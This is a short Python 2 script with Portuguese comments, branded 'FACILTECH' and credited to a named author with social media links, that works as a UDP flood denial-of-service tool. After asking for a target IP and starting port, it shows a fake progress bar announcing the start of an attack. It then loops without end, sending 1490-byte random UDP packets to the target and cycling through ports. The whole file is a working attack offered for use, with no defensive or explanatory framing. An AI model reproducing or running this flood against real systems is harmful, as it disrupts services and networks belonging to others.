#!/usr/bin/python
import sys                    ### Biblioteca de argumentos
import os
import time                   ### Bliblioteca de tempo
import socket                 ### Biblioteca para fazer o socket
import random                 ### Bliblioteca para gerar aleatorio

print "    _________   ____________  ____________________  __"
print "   / ____/   | / ____/  _/ / /_  __/ ____/ ____/ / / /"
print "  / /_  / /| |/ /    / // /   / / / __/ / /   / /_/ / "
print " / __/ / ___ / /____/ // /___/ / / /___/ /___/ __  /  "
print "/_/   /_/  |_\____/___/_____/_/ /_____/\____/_/ /_/   "
print"                                                       "
#Nesse momento vamos coletar os dados de tempo
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

############## Vamos fazer aqui o socket ##################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

print "Author   : Eduardo Amaral"
print "You Tube : https://www.youtube.com/faciltech"
print "github   : https://github.com/Amaroca"
print "Facebook : https://www.facebook.com/faciltech123"
print
ip = raw_input("Digite o IP do Alvo : ")
port = input("Digite a Porta       : ")
print "Iniciando ataque."
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Enviando %s pacotes to %s para a porta:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
